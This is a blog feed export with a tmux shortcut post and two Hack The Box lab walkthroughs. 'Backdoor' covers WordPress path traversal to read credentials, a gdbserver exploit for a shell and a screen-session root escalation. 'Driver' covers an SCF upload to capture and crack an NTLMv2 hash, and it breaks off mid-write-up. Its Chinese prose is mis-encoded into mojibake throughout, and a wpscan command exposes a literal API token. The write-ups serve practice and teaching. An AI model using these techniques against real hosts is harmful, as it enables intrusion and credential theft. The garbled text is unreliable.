    <content><![CDATA[<h1 id="tmuxå¸¸ç”¨å¿«æ·é”®"><a href="#tmuxå¸¸ç”¨å¿«æ·é”®" class="headerlink" title="tmuxå¸¸ç”¨å¿«æ·é”®"></a>tmuxå¸¸ç”¨å¿«æ·é”®</h1><h2 id="Ctrl-B-ï¼šå‚ç›´åˆ‡å‰²"><a href="#Ctrl-B-ï¼šå‚ç›´åˆ‡å‰²" class="headerlink" title="Ctrl+B+% ï¼šå‚ç›´åˆ‡å‰²"></a>Ctrl+B+% ï¼šå‚ç›´åˆ‡å‰²</h2><p><img src="https://img-blog.csdnimg.cn/9a0a7180dae946beab3aad3276c1d766.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="Ctrl-B-â€-ï¼šæ°´å¹³åˆ‡å‰²"><a href="#Ctrl-B-â€-ï¼šæ°´å¹³åˆ‡å‰²" class="headerlink" title="Ctrl+B+â€ ï¼šæ°´å¹³åˆ‡å‰²"></a>Ctrl+B+â€ ï¼šæ°´å¹³åˆ‡å‰²</h2><p><img src="https://img-blog.csdnimg.cn/70ecdf4c06bf460890a2cbde51f25770.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<h2 id="Ctrl-B-o-ï¼šåˆ‡æ¢çª—å£"><a href="#Ctrl-B-o-ï¼šåˆ‡æ¢çª—å£" class="headerlink" title="Ctrl+B+o ï¼šåˆ‡æ¢çª—å£"></a>Ctrl+B+o ï¼šåˆ‡æ¢çª—å£</h2><p><img src="https://img-blog.csdnimg.cn/9938e474239449b4ae08d755416f0067.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<h2 id="Ctrl-B-ï¼šæ»‘åŠ¨æ»šè½®æŸ¥çœ‹ï¼ŒæŒ‰Ctrl-ï¼šå–æ¶ˆå½“å‰çŠ¶æ€"><a href="#Ctrl-B-ï¼šæ»‘åŠ¨æ»šè½®æŸ¥çœ‹ï¼ŒæŒ‰Ctrl-ï¼šå–æ¶ˆå½“å‰çŠ¶æ€" class="headerlink" title="Ctrl+B+[ ï¼šæ»‘åŠ¨æ»šè½®æŸ¥çœ‹ï¼ŒæŒ‰Ctrl+[ ï¼šå–æ¶ˆå½“å‰çŠ¶æ€"></a>Ctrl+B+[ ï¼šæ»‘åŠ¨æ»šè½®æŸ¥çœ‹ï¼ŒæŒ‰Ctrl+[ ï¼šå–æ¶ˆå½“å‰çŠ¶æ€</h2><p><img src="https://img-blog.csdnimg.cn/53014b87bb444b46804a88388407213a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="Ctrl-B-zï¼šå¯¹å½“å‰çª—å£è¿›è¡Œå…¨å±æ˜¾ç¤ºï¼Œå†æŒ‰Ctrl-zå–æ¶ˆå½“å‰çŠ¶æ€"><a href="#Ctrl-B-zï¼šå¯¹å½“å‰çª—å£è¿›è¡Œå…¨å±æ˜¾ç¤ºï¼Œå†æŒ‰Ctrl-zå–æ¶ˆå½“å‰çŠ¶æ€" class="headerlink" title="Ctrl+B+zï¼šå¯¹å½“å‰çª—å£è¿›è¡Œå…¨å±æ˜¾ç¤ºï¼Œå†æŒ‰Ctrl+zå–æ¶ˆå½“å‰çŠ¶æ€"></a>Ctrl+B+zï¼šå¯¹å½“å‰çª—å£è¿›è¡Œå…¨å±æ˜¾ç¤ºï¼Œå†æŒ‰Ctrl+zå–æ¶ˆå½“å‰çŠ¶æ€</h2><p><img src="https://img-blog.csdnimg.cn/90618e8faace419c8a87e91f4636e7ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="Ctrl-B-tï¼šæ˜¾ç¤ºå½“å‰æ—¶é—´"><a href="#Ctrl-B-tï¼šæ˜¾ç¤ºå½“å‰æ—¶é—´" class="headerlink" title="Ctrl+B+tï¼šæ˜¾ç¤ºå½“å‰æ—¶é—´"></a>Ctrl+B+tï¼šæ˜¾ç¤ºå½“å‰æ—¶é—´</h2><p><img src="https://img-blog.csdnimg.cn/cf7410461f82438da252e6c633cad922.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
  </entry>
  <entry>
    <title>Backdoor</title>
    <url>/2022/01/04/Backdoor/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/91c55463b8894dfc8281797fa545de3c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†<code>backdoor.htb</code>æ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­åï¼Œè®¿é—®webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªWordPressé¡µé¢ï¼Œå¹¶ä¸”ç‰ˆæœ¬æ˜¯<code>5.8.1</code><br><img src="https://img-blog.csdnimg.cn/fc20025359b542d092eda73dfd36dc39.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>æ—¢ç„¶æ˜¯wordpressï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨wpscanæ¥æ‰«æå­˜åœ¨å“ªäº›æ¼æ´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://backdoor.htb/ --api-token X4CFiaLdgwD6FwDMhkrZMpNjFDZ7Ex6DWqlcPM9DVic --enumerate p,u --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c7c8fb81233a4b49b06e3d757078c9dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­˜åœ¨ä¸€ä¸ªç»„ä»¶æ¼æ´ï¼Œè·¯å¾„æ˜¯<code>http://backdoor.htb/wp-content/plugins/akismet/</code>ï¼Œæˆ‘ä»¬è®¿é—®å…¶ä¸Šä¸€çº§ç›®å½•å‘ç°æ˜¯ebookçš„æ’ä»¶<br><img src="https://img-blog.csdnimg.cn/59ce377ff44443e0ae407e8028b768a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬åœ¨EDBä¸Šå‘ç°äº†è¿™ä¸ªç»„ä»¶å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´<br><img src="https://img-blog.csdnimg.cn/c15aaa1c2f99402aa234d95d4ba7d7ff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è®¿é—®å…¶è·¯å¾„ï¼Œå¹¶å°†wp-config.phpæ–‡ä»¶ä¸‹è½½ä¿å­˜ä¸‹æ¥ï¼Œå‘ç°äº†mysqlçš„ç”¨æˆ·åå’Œå¯†ç <br><img src="https://img-blog.csdnimg.cn/9276f5329d5444d1a4e7f701f2b2b3e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬åˆ°åå°è¿›è¡Œç™»å½•æ—¶å‘ç°æ— è®ºæ˜¯<code>admin</code>å’Œ<code>wordpressuser</code>éƒ½æ˜¯ç™»é™†å¤±è´¥çš„<br><img src="https://img-blog.csdnimg.cn/d7d52ae101994365b067e0463284ecec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬åªèƒ½åˆ‡æ¢å¦ä¸€ä¸ªæ€è·¯äº†ï¼Œä¸Šé¢æˆ‘ä»¬è¯´åˆ°æ—¶å­˜åœ¨ä¸€ä¸ªLFIæ¼æ´çš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨LFISuiteè¿›è¡Œè·¯å¾„çš„æ£€æµ‹<br><img src="https://img-blog.csdnimg.cn/12af5d4372a042a783fd87b77f83506d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è™½ç„¶å¯ä»¥æ‰¾åˆ°passwdæ–‡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»»ä½•çš„ä½œç”¨<br><img src="https://img-blog.csdnimg.cn/be7eb457f68b4b6799558545455b690c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç›®æ ‡ä¸»æœºéƒ½åœ¨è¿è¡Œé‚£äº›è¿›ç¨‹ï¼Œé€šè¿‡ä¼ å…¥<code>/proc/pid/cmdline</code>è¿™ä¸ªè·¯å¾„å‚æ•°ï¼Œå…¶ä¸­pidçš„å€¼æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ¨¡ç³Šï¼Œå¹¶ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…åˆ†æã€‚å…¶ä¸­ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Œè¿™æ˜¯Linux æ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡ç»“æ„çš„æ–‡ç« è§£æé“¾æ¥<a href="https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html">https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html</a><br><img src="https://img-blog.csdnimg.cn/bffa7223627d4dfe8db4b137b4984909.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2a11eb47eaea430685df1782909d56fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å‘ç°è¿›ç¨‹å·ä¸º793çš„è¿›ç¨‹ï¼Œåœ¨æœ¬æœºçš„1337ç«¯å£ä¸Šè¿è¡Œè¿™ä¸€ä¸ª<code>gdbserver</code>è¿™æ ·ä¸€ä¸ªç¨‹åº<br><img src="https://img-blog.csdnimg.cn/f4483a61544247d282456891a4d1f1dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="ç¬¬ä¸€ç§æ–¹æ³•"><a href="#ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³•"></a>ç¬¬ä¸€ç§æ–¹æ³•</h3><p>æˆ‘ä»¬åœ¨EDBä¸­å‘ç°äº†gdbserverè¿™ä¸ªç¨‹åºæ˜¯å­˜åœ¨æ¼æ´çš„<br><img src="https://img-blog.csdnimg.cn/abd8f238cf054450a79a3a3d13e79783.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°†å…¶å†…å®¹ä¿å­˜ä¸ºexp.pyæ–‡ä»¶ï¼Œç„¶åæŒ‰ç…§æç¤ºå…ˆç”Ÿæˆä¸€ä¸ªrev.binæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/54d8c0fbe2bc4a9590f41b6770b2bee0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå¼€å¯ç›‘å¬ï¼Œè¿è¡Œæˆ‘ä»¬çš„expå¹¶è·å–ç›®æ ‡ä¸»æœºçš„shell<br><img src="https://img-blog.csdnimg.cn/1da19bb296474d1fa28f040adfacede6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/6b571bba98c44cfe92c049f327069088.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h3 id="ç¬¬äºŒç§æ–¹æ³•"><a href="#ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³•"></a>ç¬¬äºŒç§æ–¹æ³•</h3><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡MSFç¨‹åºè·å–ç›®æ ‡ä¸»æœºçš„shellï¼Œå¹¶è®¾ç½®å¯¹åº”çš„å‚æ•°é¡¹<br><img src="https://img-blog.csdnimg.cn/a0817ecc48414e04ba28a8126f1f05a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæç¤ºè¿™ä¸ªpayloadè¿è¡Œé”™è¯¯ï¼ŒåŸå› æ˜¯ä¸»æœºå¹¶ä¸æ˜¯32ä½çš„ï¼Œæ˜¯64ä½çš„<br><img src="https://img-blog.csdnimg.cn/c9995cd3ea9b4b509c347aa0508635b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŠŠå‚æ•°è®¾ç½®ä¸º64ä½å†è¿è¡Œå³å¯<br><img src="https://img-blog.csdnimg.cn/5ab52ced97f449338a1cd14d20707741.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/0950beedec5c4b9894654396d09fd96c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬å°†<code>linpeas.sh</code>è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šå¹¶è¿è¡Œå®ƒ<br><img src="https://img-blog.csdnimg.cn/ace832b109ac4ca391a07343bc66a62b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªå¯ç–‘çš„è¿›ç¨‹æ˜¯å¯èƒ½å­˜åœ¨æ¼æ´åˆ©ç”¨çš„<br><img src="https://img-blog.csdnimg.cn/9219d9c4acde429db32f97840917256e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨pspyç¨‹åºç›‘å¬ä¸€ä¸‹ä¸»æœºçš„è¿›ç¨‹<br><img src="https://img-blog.csdnimg.cn/a2824fa9dada431e948761bc432f95f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°è¿™ä¸ªè¿›ç¨‹æ˜¯æ¯ä¼‘çœ ä¸€æ®µæ—¶é—´å°±ä¼šå†æ¬¡è¿è¡Œï¼Œå¹¶ä¸”éƒ½æ˜¯ä»¥rootèº«ä»½æ¥è¿è¡Œçš„<br><img src="https://img-blog.csdnimg.cn/597c98a3121744a98ac64e76c51564aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç°åœ¨ä½¿ç”¨çš„ç»ˆç«¯æ˜¯dumb<br><img src="https://img-blog.csdnimg.cn/9e65175ae79346ecb3631d670afba0e1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¦å°†å…¶è®¾ç½®ä¸ºxtermç»ˆç«¯<br><img src="https://img-blog.csdnimg.cn/eab51c482a6c47ef9827e3de470b933f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæŸ¥çœ‹screençš„å¸®åŠ©å‘½ä»¤å‘ç°ï¼Œ-xå‚æ•°å¯ä»¥å¸®æˆ‘ä»¬ç›´æ¥è¿›å…¥å¦ä¸€ä¸ªç»ˆç«¯ç•Œé¢ï¼Œå› ä¸ºscreenç¨‹åºæ˜¯ä»¥rootèº«ä»½è¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½ç›´æ¥è¿›å…¥rootç»ˆç«¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -x root/root</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/c8e276d5bacf4eeba50d6692a9160185.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>LFI</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Driver</title>
    <url>/2022/01/01/Driver/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†webæœåŠ¡å’ŒSMBæœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop]</span><br><span class="line">â””â”€# bash nmap.sh 10.10.11.106                                                                                                                 1 âš™</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-01 02:43 EST</span><br><span class="line">Nmap scan report for 10.10.11.106</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80&#x2F;tcp   open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP&#x2F;1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm&#x3D;MFP Firmware Update Center. Please enter password for admin</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">135&#x2F;tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">5985&#x2F;tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-01-01T14:43:35</span><br><span class="line">|_  start_date: 2022-01-01T14:37:37</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 53.61 seconds</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è®¿é—®webæœåŠ¡æ—¶ï¼Œæç¤ºæˆ‘ä»¬è¦è¾“å…¥è´¦å·å’Œå¯†ç ï¼Œæˆ‘ä»¬ä½¿ç”¨admin/adminç™»å½•æˆåŠŸ</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/c4d2b8fafacf4a7e83de610beea75a59.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç™»å½•é¡µé¢æ—¶å‘ç°æ˜¯å°æ‰“å°æœºï¼Œæˆ‘ä»¬ç‚¹å‡»<code>Fireware Updates</code>é¡µé¢ï¼Œå‘ç°ç±»ä¼¼æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢<br><img src="https://img-blog.csdnimg.cn/2e214c05a4a54abcba4a54c4b911d11f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><!--more-->

<p>æˆ‘å°è¯•äº†å¾ˆä¹…çš„æ–‡ä»¶ä¸Šäº§webshelléƒ½æ²¡æœ‰æˆåŠŸï¼Œåˆ‡æ¢æ€è·¯ï¼Œæ—¢ç„¶ç›®æ ‡ä¸»æœºå¼€æ”¾äº†445ç«¯å£å’Œå…±äº«SMBæœåŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨SCFæ–‡ä»¶æ”»å‡»(è™½ç„¶è¿™ç§æ”»å‡»æ–¹å¼å¾ˆä¸å¸¸è§)ã€‚æˆ‘ä»¬é¦–å…ˆå…ˆæ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªscfæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/5d503addbbcf4fd683f0a1c02274294e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå¯åŠ¨responderç¨‹åºè¿›è¡Œç›‘å¬<br><img src="https://img-blog.csdnimg.cn/c906af81139e4e569a4ca96169bb3d3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¸Šä¼ æˆ‘ä»¬å†™çš„shell.scfæ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸåä¼šå‡ºç°ä¸€ä¸ªtonyç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼ŒåŠ å¯†çš„æ–¹å¼æ˜¯<code>NTLMv2</code><br><img src="https://img-blog.csdnimg.cn/4b75787e99934dc8986ba6a5d124e686.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨hashcatå¯¹è¿™ä¸ªå“ˆå¸Œå€¼è¿›è¡Œç ´è§£ï¼Œç ´è§£å¾—åˆ°çš„å¯†ç æ˜¯<code>liltony</code><br><img src="https://img-blog.csdnimg.cn/b4ae03ebc9e441cb81c41063bde7d8f7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªè´¦å·å¯†ç è¿›è¡Œç™»å½•ï¼Œå¾—åˆ°äº†æ™®é€šç”¨æˆ·çš„æƒé™<br><img src="https://img-blog.csdnimg.cn/ac151987bd374eeb9178da89785bfe70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æŸ¥çœ‹åˆ°å­˜åœ¨<code>spoolsv</code>è¿™ä¸ªè¿›ç¨‹ï¼Œè¿™æ˜¯ä¸€ä¸ª<code>Windows Print Spooler</code>æœåŠ¡ï¼Œå­˜åœ¨ä¸€ä¸ªCVEæ¼æ´ç¼–å·ï¼Œå¯¹åº”çš„CVEç¼–å·æ˜¯<code>CVE-2021-1675</code><br><img 